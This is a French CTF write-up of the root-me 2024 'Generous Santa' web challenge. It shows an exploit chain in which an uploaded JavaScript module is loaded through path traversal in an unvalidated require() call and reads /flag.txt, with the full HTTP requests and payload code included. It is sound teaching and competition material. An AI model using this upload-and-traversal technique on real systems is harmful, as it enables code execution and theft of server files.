@@ -1,0 +1,305 @@
+view: writeup
+language: en
+seo:
+  title: XMAS root-me web challenge, Generous Santa
+  description:
+  keywords: ctf, security, root-me, xmas, web, generous santa, write-up
+  author: Antoine Benevaut
+  twitter: "@abenevaut"
+  og-image: https://www.abenevaut.dev/images/abenevaut-og.webp
+  url: https://www.abenevaut.dev/2024-xmas-root-me/01-web-generous-santa-1.html
+
+writeup: |+
+  # Write-up Generous Santa
+  
+  12h00, 1er décembre 2024, le challenge XMAS de root-me démarre avec une épreuve web "Generous Santa", c'est parti!
+  
+  L'épreuve est en source ouverte, vous pouvez la retrouver sur [GitHub]().
+  
+  Dans le code, on trouve une application web en NodeJS, un Dockerfile (avec un docker-compose), le fichier du flag et un README, qui nous dit:
+  
+  > The number of Santa's lunti has increased by 1337 this year, and there are a lot of them! Thanks to this, they've been able to give you some very, very nice gifts.
+  > If you can't find what you're looking for, you can even suggest gifts to him - maybe they'll make them in time!
+  
+  Le premier cadeau ayant été déjà livré (ce challenge), allons voir comment on peut encore remplir la hotte du Père Noël.
+  
+  Je l'ai dit, nous sommes en source ouverte, donc on devrait pouvoir savoir rapidement ou nous allons devoir chercher le flag.
+  
+  Une petite recherche sur l'ensemble des fichiers du projet avec "flag.txt" nous montre que le flag va être copié sur le container Docker à l'emplacement `/flag.txt`.
+  Pour ce qui est des droits, le fichier appartient à l'utilisateur "santa" qui est aussi l'utilisateur courant.
+  
+  ```Dockerfile
+  COPY flag.txt /flag.txt
+  RUN chown santa:santa /flag.txt
+  
+  USER santa
+  ```
+  
+  On peut aussi noter que c'est l'utilisateur "santa" qui va exécuter l'application node.
+  
+  ```Dockerfile
+  USER santa
+  
+  CMD ["npm", "start"]
+  ```
+
+  Pour le moment, on peut se laisser dire que si on casse l'app node, nous pourrons lire le flag.
+
+  Maintenant, à quoi ressemlble l'application ?
+  
+  ![](images/ctf-2024-rootme-xmas/web-generous-santa-1-overview.png)
+  
+  On a une page d'accueil pour voir les cadeaux et une seconde page avec un formulaire pour suggérer un cadeau.
+  Mis à part la navigation, on trouve sur ces pages deux actions distincts, un bouton pour "ajouter les cadeaux" et un formulaire pour "suggérer un cadeau".
+  
+  On va donc regarder ce qui se passe lorsque l'on actionne ces deux éléments. On commence avec la pas d'accueil.
+  
+  ![](images/ctf-2024-rootme-xmas/web-generous-santa-1-home-query.png)
+  
+  Au click sur le bouton "Ajouter les cadeaux", l'application fait une requête POST sur `/api/add` avec un payload JSON.
+  On reproduit la requête avec ijhttp, dans un fichier `exploit.http`:
+  
+  > ijhttp est l'outil de jetbrains pour jouer des requêtes HTTP. Il est intégré dans les IDE web de jetbrains.
+  > Vous pouvez également l'utiliser en standalone en l'installant via ce [lien](https://www.jetbrains.com/ijhttp/download/#section=zip-archive).  
+  
+  ```curl
+  POST https://day1.challenges.xmas.root-me.org/api/add
+  Content-Type: application/json
+  
+  {"product":"Bugatti"}
+  ```
+  
+  Si on l'exécute, on obtient la réponse suivante:
+  
+  ```response
+  HTTP/2 200 OK
+  ...
+  
+  {
+    "success": true,
+    "output": {
+      "name": "Bugatti",
+      "description": "Description of Bugatti",
+      "_id": "674c7c4171020c0a249a06e7"
+    }
+  }
+  ```
+  
+  Soyons taquin, que se passe t'il si on envoie un JSON dans lequel on changerai la valeur de `product` ?
+  
+  ```curl
+  POST https://day1.challenges.xmas.root-me.org/api/add
+  Content-Type: application/json
+  
+  {"product":"Exploit"}
+  ```
+  
+  Si on l'exécute, on obtient la réponse suivante:
+  
+  ```response
+  HTTP/2 500 Internal Server Error
+  ...
+  
+  {
+    "message": "Error adding the product Exploit. Cannot find module '../models/exploit'\nRequire stack:\n- /usr/app/routes/hotte.js\n- /usr/app/app.js"
+  }
+  ```
+  
+  🎅Hohoho! `Cannot find module '../models/exploit'\nRequire stack:\n- /usr/app/routes/hotte.js` nous indique que l'application cherche un module `../models/exploit` dans le fichier `hotte.js`.
+  Surement une piste pour exploiter l'application, une entrée ne doit pas être correctement validée. Que nous dit le code ?
+
+  ```javascript
+  router.post('/add', async (req, res) => {
+    const { product } = req.body;
+
+    try {
+        const Gift = require(`../models/${product.toLowerCase()}`);
+        const gift = new Gift({ name: product, description: `Description of ${product}` });
+        output = gift.store();
+        res.json({ success: true, output: output });
+    } catch (error) {
+        res.status(500).json({ message: `Error adding the product ${product}. ${error.message}` });
+    }
+  });
+  ```
+  
+  Le code nous dit que l'application va chercher un module dans le dossier `models` avec le nom du produit en minuscule `require(`../models/${product.toLowerCase()}`)`.
+  Pas de validation particulière sur le nom du produit, on peut donc envoyer n'importe quoi et l'application va chercher un module avec ce nom.
+  Si le module n'existe pas, l'application renvoie une erreur 500 avec le message d'erreur.
+  
+  Parfait, les requêtes et leurs réponses font sens. Si seulement je pouvais envoyer un faux models pour lire le flag...
+  
+  Alors, que se passe-t-il du côté du formulaire de suggestion de cadeau ?
+  
+  ![](images/ctf-2024-rootme-xmas/web-generous-santa-1-suggest-query.png)
+  
+  À la soumission du formulaire, l'application fait une requête POST sur `/api/suggest` avec un content type `application/multipart/form-data`.
+  On soumet un fichier, tout cela fait donc sens. On notera aussi le nom des champs `name` et `photo`.
+  
+  On reproduit la requête avec ijhttp, dans notre fichier `exploit.http`.
+  On va envoyer notre formulaire avec le champ "name" qui vaut "Nasa" et le champ photo qui est un fichier PNG `nasa.png`.
+  
+  ```curl
+  POST https://day1.challenges.xmas.root-me.org/api/suggest
+  Content-Type: multipart/form-data; boundary=WebAppBoundary
+  
+  --WebAppBoundary
+  Content-Disposition: form-data; name="name"
+  
+  Nasa
+  
+  --WebAppBoundary
+  Content-Disposition: form-data; name="photo"; filename="nasa.png"
+  Content-Type: image/png
+  
+  < ./nasa.png
+  
+  --WebAppBoundary--
+  ```
+  
+  Status code 200, tout c'est bien passé. On obtient la réponse qui suit et on notre attention va se porter sur la valeur de `photoPath`.
+  
+  ```response
+  HTTP/2 200 OK
+  ...
+  
+  {
+    "message": "Thank you! Santa will consider your suggestion.",
+    "photoPath": "/tmp/2024-12-01_20-27-2/nasa.png"
+  }
+  ```
+  
+  🎅Hohoho! `"photoPath": "/tmp/2024-12-01_20-27-2/nasa.png"` nous indique que le fichier a été uploadé dans le dossier `/tmp/2024-12-01_20-27-2/`.
+  
+  Si on récapitule :
+  - nous avons le endpoint `/api/add` qui va chercher un module dans le dossier `models` avec un nom produit qui semble être exploitable
+  - nous avons le endpoint `/api/suggest` qui va uploader un fichier dans le dossier `/tmp/2024-12-01_20-27-2/`
+  
+  Ça sent l'attaque en deux étapes! Non ? Plusieurs idées viennent alors en tête :
+  - Est-ce que l'on peut envoyer n'importe quel type de fichier sur le endpoint de suggestion ?
+  - Est-ce que l'on peut réussir à exécuter un "models" truqué et avec lire le flag ?
+  
+  Allez, on s'y colle! On va essayer d'envoyer un fichier `exploit.js` sur le endpoint de suggestion.
+  
+  Pour créer ce fichier `exploit.js`, on va dupliquer un model existant et adapté rapidement le contenu.
+  Un copy/paste du fichier bugatti.js puis un find & replace de bugatti en exploit, et on est pas mal pour une première tentative ?
+  
+  ```javascript
+  const mongoose = require('mongoose');
+  
+  const exploitSchema = new mongoose.Schema({
+    name: { type: String, default: 'exploit' },
+    description: { type: String, default: 'A luxury high-performance exploit.' }
+  });
+    
+  exploitSchema.methods.store = function() {
+    console.log('exploit stored in the sack.');
+    return this;
+  };
+  
+  module.exports = mongoose.model('exploit', exploitSchema);
+  ```
+  
+  On tente d'envoyer notre fichier
+  
+  ```curl
+  POST https://day1.challenges.xmas.root-me.org/api/suggest
+  Content-Type: multipart/form-data; boundary=WebAppBoundary
+  
+  --WebAppBoundary
+  Content-Disposition: form-data; name="name"
+  
+  Nasa
+  
+  --WebAppBoundary
+  Content-Disposition: form-data; name="photo"; filename="exploit.js"
+  Content-Type: image/png
+  
+  < ./exploit.js
+  
+  --WebAppBoundary--
+  ```
+  
+  > J'ai réessayé ensuite sans le `Content-Type: image/png` et ça a fonctionné. Zéro vérification donc. Même pas besoin de checker le code, Merci Père Noël!
+  
+  Et ça fonctionne! Notre fichier exploit est uploadé dans le dossier `/tmp/2024-12-01_20-43-18/exploit.js`.
+  
+  ```reponse
+  HTTP/2 200 OK
+  ...
+  
+  {
+    "message": "Thank you! Santa will consider your suggestion.",
+    "photoPath": "/tmp/2024-12-01_20-43-18/exploit.js"
+  }
+  ```
+  
+  Super! On "n'a plus qu'a" trouver un "path traversal" sur le endpoint `/api/add` pour exécuter notre fichier.
+  
+  > [Path traversal](https://owasp.org/www-community/attacks/Path_Traversal) est une technique qui vise à utiliser des path non prévu pour accéder à des fichiers ou des répertoires auxquels l'utilisateur peut parfois ne pas avoir accès.
+  > Dans notre cas, le endpoint `/api/add` n'a pas vocation à requérir des fichiers depuis un autre répertoire que le répertoire `src/models` de l'app. 
+  
+  On va essayer de pas trop tâtonner, on récapitule les infos utiles :
+  - le flag est dans le fichier `/flag.txt`
+  - notre exploit est uploadé dans `/tmp/2024-12-01_20-43-18/exploit.js`
+  - on va essayer de charger un model et on sait qu'on essaie de le faire avec ce path `../models/${product.toLowerCase()}`
+  
+  Essayons d'expliciter le path des models, `../models/${product.toLowerCase()}` c'est pas assez clair.
+  C'est ou `../models` ?
+  
+  On sait que le repertoire models est dans le repertoire `src/` du projet. Mais ou est stocké ce répertoire ?
+  
+  Dans le Dockerfile, on trouve l'instruction `COPY ./src/ ./` et un peu plus haut l'instruction `WORKDIR /usr/app`.
+  Nos sources sont donc localisées dans `/usr/app/src/` et les models dans `/usr/app/src/models/`.
+  
+  🎄Le sapin s'illumine, pour aller de `models/` à /tmp/2024-12-01_20-43-18/exploit.js, il nous faut remonter de 4 niveaux.
+  On va donc essayer de charger notre exploit avec le path `../../../../tmp/2024-12-01_20-43-18/exploit` (sans l'extension).
+  
+  Allez! On essaie!
+  
+  ```curl
+  POST https://day1.challenges.xmas.root-me.org/api/add
+  Content-Type: application/json
+  
+  {"product":"../../../../tmp/2024-12-01_20-43-18/exploit"}
+  ```
+  
+  Avant de vous montrez l'exploit final, plusieurs étapes on été nécessaires _ainsi que plusieurs essaies_:
+  
+  Lors du premier essai, une erreur m'est retournée, impossible de trouver le package `mongoose`, une dépendance du model incluse via `npm`.
+  Pour l'inclure, il a fallu indiquer le path complet vers le package `const mongoose = require('/usr/app/node_modules/mongoose');`.
+  
+  Au second essai, une nouvelle erreur m'indique que mon model est déja chargé avec le nom "exploit", c'est tout à fait normal et relatif au cycle de vie de Express.js.
+  L'application node a deux cycles de vie principaux, le premier régie le serveur web (attend une requête) et le second régie l'exécution d'une requête.
+  
+  L'exécution d'une requête est éphémère, les variables sont détruites lorsque la réponse est retournée.
+  En revanche, le serveur web est persistant, les variables sont conservées entre les requêtes.
+  
+  Pour corriger le tire, j'ai usé d'astuce en incrémentant simplement le nom du fichier `exploit` à chaque essai (exploit1, exploit2, exploit3... 🤦‍♂️vous avez compris).
+  
+  Enfin, quand j'ai eu un model fonctionnel, j'ai pu ajouter la lecture du flag `fs.readFileSync('/flag.txt')`.
+
+  ```javascript
+  const mongoose = require('/usr/app/node_modules/mongoose');
+  const fs = require('fs');
+  
+  const exploit9Schema = new mongoose.Schema({
+    name: { type: String, default: 'exploit9' },
+    description: { type: String, default: 'A luxury high-performance exploit9.' },
+    fileContent: { type: String, default: fs.readFileSync('/flag.txt') }
+  });
+  
+  exploit9Schema.methods.store = function() {
+    console.log('exploit9 stored in the sack.');
+    
+    return this
+  };
+  
+  module.exports = mongoose.model('exploit9', exploit9Schema);
+  ```
+
+  🎁On envoie notre requête et on obtient le flag 🏁
+
+  ![](images/ctf-2024-rootme-xmas/web-generous-santa-1-flag.png)
+
+  Crédits du challenge [root-me.org](https://x.com/rootme_org/status/1863296339183796546) et son auteur [Elweth](https://x.com/Elweth_)
